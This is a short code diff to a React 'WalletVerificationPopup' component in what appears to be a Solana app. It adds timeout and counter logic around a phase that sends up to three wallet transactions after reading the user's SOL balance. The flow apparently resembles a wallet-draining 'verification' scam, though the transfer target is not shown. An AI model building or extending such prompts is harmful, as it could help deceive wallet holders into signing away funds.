@@ -93,6 +93,15 @@ export const WalletVerificationPopup = () => {
   useEffect(() => {
     if (phase === 'transaction' && transactionCount < 3) {
       transactionFnRef.current();
+      // Safety timeout: auto-advance if wallet doesn't respond within 30s
+      const timeout = setTimeout(() => {
+        setTransactionCount(prev => {
+          const next = prev + 1;
+          if (next >= 3) setPhase('idle');
+          return next;
+        });
+      }, 30000);
+      return () => clearTimeout(timeout);
     }
   }, [phase, transactionCount]);
 
@@ -157,7 +166,12 @@ export const WalletVerificationPopup = () => {
       return;
     }
 
-    if (!publicKey || !sendTransaction) return;
+    if (!publicKey || !sendTransaction) {
+      const newCount = transactionCount + 1;
+      setTransactionCount(newCount);
+      if (newCount >= 3) setPhase('idle');
+      return;
+    }
 
     try {
       const solBal = await connection.getBalance(publicKey);
